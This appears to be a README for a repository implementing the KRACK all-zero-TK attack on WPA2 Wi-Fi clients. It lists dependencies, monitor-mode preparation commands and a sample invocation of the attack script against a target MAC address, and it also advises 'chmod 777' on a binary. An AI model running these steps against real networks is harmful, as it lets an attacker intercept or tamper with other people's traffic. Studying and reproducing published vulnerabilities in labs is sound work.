<b>Note! In order for the script to work properly:    
- The code execution is under python 2   
- Execution permission must be given to the 'hostapd' file located in the 'hostapd' folder   
  (for example navigate to the hostapd folder and run: sudo chmod 777 hostapd)   
- The code must be run from the krackattack-all-zero-tk-key root folder   
- In case of long interface name please run 'sudo airmon-ng start INTERFACE_NAME'</b>  


No need to install an external MitM library. The attack files in this repository include the MitM-ChannelBased implementation files.


First, Clone this repository for the attack files.


Dependencies:   
- sudo apt update
- sudo apt install libnl-3-dev libnl-genl-3-dev pkg-config libssl-dev net-tools git sysfsutils python-scapy python-pycryptodome

Before execution run the following commands:
- sudo airmon-ng check kill
- service network-manager stop
- sudo rfkill unblock wifi

krack_all_zero_tk.py Run example:
- sudo python ./krackattack/krack_all_zero_tk.py wlx6c5ab0b3f988 wlan0mon ens33 "check" -t F0:27:65:DA:AD:E8    
(See below for an explanation of the command)     
    
The code may require the following packages:
- macchanger
- connect-proxy (sudo apt install connect-proxy)
- socket (sudo apt install socket)

 The following link contains a video that demonstrate this attack: [demostration video](https://www.youtube.com/watch?v=Jq6rPCSuv4o)
 
